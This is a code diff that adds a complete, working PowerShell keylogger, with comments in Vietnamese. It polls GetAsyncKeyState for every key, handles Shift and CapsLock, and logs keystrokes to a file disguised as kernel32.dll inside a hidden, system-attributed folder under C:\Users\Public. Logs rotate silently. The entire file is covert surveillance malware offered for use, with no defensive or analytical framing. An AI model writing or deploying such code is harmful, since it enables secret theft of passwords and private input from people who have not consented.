@@ -1,0 +1,177 @@
+# ============================================================
+# KEYLOGGER - Ban hoan chinh (ASCII only)
+# - Bat: chu, so, dau cau, phim dac biet, Shift/CapsLock dung
+# - Log: C:\Users\Public\System32\kernel32.dll (masquerading)
+# - Rotating log: tu xoa khi > 10MB
+# ============================================================
+
+$PublicDir  = "C:\Users\Public\System32"
+$LogFile    = "$PublicDir\kernel32.dll"
+$MaxLogSize = 10MB
+
+# Tao thu muc an
+if (-not (Test-Path $PublicDir)) {
+    New-Item -Path $PublicDir -ItemType Directory -Force -EA SilentlyContinue | Out-Null
+    attrib +h +s $PublicDir 2>$null
+}
+
+# ============================================================
+# P/Invoke GetAsyncKeyState
+# ============================================================
+if (-not ("KeyLogger" -as [type])) {
+    Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class KeyLogger {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
+}
+
+# ============================================================
+# Map phim dac biet
+# ============================================================
+$specialKeys = @{
+    8   = "[BACKSPACE]"
+    9   = "[TAB]"
+    13  = "[ENTER]`n"
+    16  = "[SHIFT]"
+    17  = "[CTRL]"
+    18  = "[ALT]"
+    19  = "[PAUSE]"
+    20  = "[CAPSLOCK]"
+    27  = "[ESC]"
+    32  = " "
+    33  = "[PGUP]"
+    34  = "[PGDN]"
+    35  = "[END]"
+    36  = "[HOME]"
+    37  = "[LEFT]"
+    38  = "[UP]"
+    39  = "[RIGHT]"
+    40  = "[DOWN]"
+    44  = "[PRTSC]"
+    45  = "[INS]"
+    46  = "[DEL]"
+    91  = "[LWIN]"
+    92  = "[RWIN]"
+    93  = "[MENU]"
+    106 = "*"
+    107 = "+"
+    109 = "-"
+    110 = "."
+    111 = "/"
+    144 = "[NUMLOCK]"
+    145 = "[SCROLLLOCK]"
+    186 = ";"
+    187 = "="
+    188 = ","
+    189 = "-"
+    190 = "."
+    191 = "/"
+    192 = "``"
+    219 = "["
+    220 = "\"
+    221 = "]"
+    222 = "'"
+}
+# F1-F12
+112..123 | ForEach-Object { $specialKeys[$_] = "[F$($_ - 111)]" }
+
+# ============================================================
+# Bang ky tu Shift (row + dau cau)
+# ============================================================
+$shiftMap = @{
+    48=')'; 49='!'; 50='@'; 51='#'; 52='$'; 53='%'; 54='^'; 55='&'; 56='*'; 57='('
+    186=':'; 187='+'; 188='<'; 189='_'; 190='>'; 191='?'
+    192='~'; 219='{'; 220='|'; 221='}'; 222='"'
+}
+
+# ============================================================
+# Ham lay text cua phim — xu ly Shift/CapsLock DUNG
+# ============================================================
+function Get-KeyText([int]$vk) {
+    # Phim dac biet
+    if ($specialKeys.ContainsKey($vk)) { return $specialKeys[$vk] }
+
+    # Doc trang thai Shift va CapsLock
+    $shift = ([KeyLogger]::GetAsyncKeyState(16) -band 0x8000) -ne 0
+    $caps  = ([KeyLogger]::GetAsyncKeyState(20) -band 0x8000) -ne 0
+
+    # A-Z (VK 65-90) — HOA neu Shift XOR CapsLock
+    if ($vk -ge 65 -and $vk -le 90) {
+        $ch = [char]$vk
+        if ($shift -xor $caps) { return $ch.ToString() }         # HOA
+        else                   { return $ch.ToString().ToLower() } # thuong
+    }
+
+    # 0-9 row (VK 48-57)
+    if ($vk -ge 48 -and $vk -le 57) {
+        if ($shift) { return $shiftMap[$vk] }
+        return [string]$vk
+    }
+
+    # Numpad 0-9 (VK 96-105)
+    if ($vk -ge 96 -and $vk -le 105) { return [string]($vk - 96) }
+
+    # Dau cau co Shift
+    if ($shiftMap.ContainsKey($vk) -and $shift) { return $shiftMap[$vk] }
+
+    return ""
+}
+
+# ============================================================
+# Rotating log
+# ============================================================
+function Test-RotateLog {
+    if (Test-Path $LogFile) {
+        $size = (Get-Item $LogFile -EA SilentlyContinue).Length
+        if ($size -gt $MaxLogSize) {
+            $backup = "$PublicDir\kernel32_$(Get-Date -Format 'yyyyMMdd_HHmmss').dll"
+            Move-Item $LogFile $backup -Force -EA SilentlyContinue
+            # Giu toi da 5 backup
+            Get-ChildItem "$PublicDir\kernel32_*.dll" -EA SilentlyContinue |
+                Sort-Object LastWriteTime -Descending |
+                Select-Object -Skip 5 |
+                Remove-Item -Force -EA SilentlyContinue
+        }
+    }
+}
+
+# ============================================================
+# Theo doi phim da nhan (tranh repeat)
+# ============================================================
+$pressed = New-Object 'System.Collections.Generic.HashSet[int]'
+
+# ============================================================
+# Vong lap chinh
+# ============================================================
+$counter = 0
+while ($true) {
+    for ($vk = 8; $vk -le 222; $vk++) {
+        try {
+            $state = [KeyLogger]::GetAsyncKeyState($vk)
+            if (($state -band 0x8000) -ne 0) {
+                if (-not $pressed.Contains($vk)) {
+                    [void]$pressed.Add($vk)
+                    $txt = Get-KeyText $vk
+                    if ($txt -ne "") {
+                        try { [System.IO.File]::AppendAllText($LogFile, $txt) } catch { }
+                    }
+                }
+            } else {
+                if ($pressed.Contains($vk)) { [void]$pressed.Remove($vk) }
+            }
+        } catch { }
+    }
+
+    # Rotating log moi 5 giay (~166 vong)
+    $counter++
+    if ($counter -ge 166) {
+        $counter = 0
+        Test-RotateLog
+    }
+
+    Start-Sleep -Milliseconds 30
+}
